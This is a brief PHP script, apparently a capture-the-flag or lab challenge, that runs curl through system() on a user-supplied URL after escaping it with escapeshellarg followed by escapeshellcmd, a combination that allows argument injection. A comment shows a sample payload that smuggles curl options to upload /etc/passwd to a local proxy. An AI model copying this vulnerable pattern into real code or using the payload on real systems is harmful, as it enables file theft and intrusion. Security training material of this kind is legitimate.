<?php


$url = $_GET['url'];
// $url = "http://127.0.0.1/' -F file=@/etc/passwd -x 127.0.0.1:9999";

$urlInfo = parse_url($url);
if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
    die( "scheme error!");
 }
$url=escapeshellarg($url);
$url=escapeshellcmd($url);
system("curl ".$url);
?>